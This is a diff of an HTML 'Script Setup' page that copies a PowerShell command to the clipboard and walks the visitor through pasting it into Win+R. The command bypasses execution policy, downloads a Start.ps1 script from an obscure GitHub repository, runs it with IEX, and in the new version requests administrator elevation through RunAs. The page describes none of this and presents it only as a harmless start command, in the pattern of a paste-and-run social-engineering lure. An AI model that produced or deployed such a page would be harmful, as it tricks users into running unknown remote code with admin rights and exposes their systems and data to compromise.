@@ -1,14 +1,46 @@
-<div style="background:#1e1e1e; color:#00ff00; padding:20px; border-radius:8px; font-family:monospace; text-align:center;">
-  <p style="color:white;">Copy this and paste it into PowerShell:</p>
-  <input type="text" value='powershell -ExecutionPolicy Bypass -Command "iex (irm https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)"' id="myInput" style="width:80%; padding:10px;">
-  <button onclick="myFunction()" style="padding:10px;">Copy Command</button>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Launcher</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #0d1117; color: white; margin: 0; }
+        .container { text-align: center; background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 500px; }
+        h1 { margin-bottom: 10px; font-size: 24px; }
+        p { color: #8b949e; margin-bottom: 30px; line-height: 1.5; }
+        .btn { background-color: #238636; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; transition: background 0.2s; width: 100%; }
+        .btn:hover { background-color: #2ea44f; }
+        .instructions { margin-top: 25px; text-align: left; background: #0d1117; padding: 15px; border-radius: 6px; font-size: 14px; border: 1px dashed #30363d; }
+        .step { color: #58a6ff; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Script Setup</h1>
+    <p>Click the button to copy the start command, then follow the instructions below.</p>
+
+    <button class="btn" onclick="copyCommand()">🚀 Start Command</button>
+
+    <div class="instructions">
+        <div><span class="step">Step 1:</span> Click the green button above.</div>
+        <div style="margin-top: 10px;"><span class="step">Step 2:</span> Press <kbd style="background:#30363d; padding: 2px 5px; border-radius:3px;">Win + R</kbd> on your keyboard.</div>
+        <div style="margin-top: 10px;"><span class="step">Step 3:</span> Paste (Ctrl+V) and press <b>Enter</b>.</div>
+    </div>
 </div>
 
 <script>
-function myFunction() {
-  var copyText = document.getElementById("myInput");
-  copyText.select();
-  navigator.clipboard.writeText(copyText.value);
-  alert("Copied! Now right-click in PowerShell to paste and run.");
-}
+    function copyCommand() {
+        const cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command IEX (iwr -UseBasicParsing https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)' -Verb RunAs\"";
+        
+        navigator.clipboard.writeText(cmd).then(() => {
+            alert("Command Copied! Now press Win+R and paste it.");
+        }).catch(err => {
+            console.error('Failed to copy: ', err);
+        });
+    }
 </script>
+
+</body>
+</html>
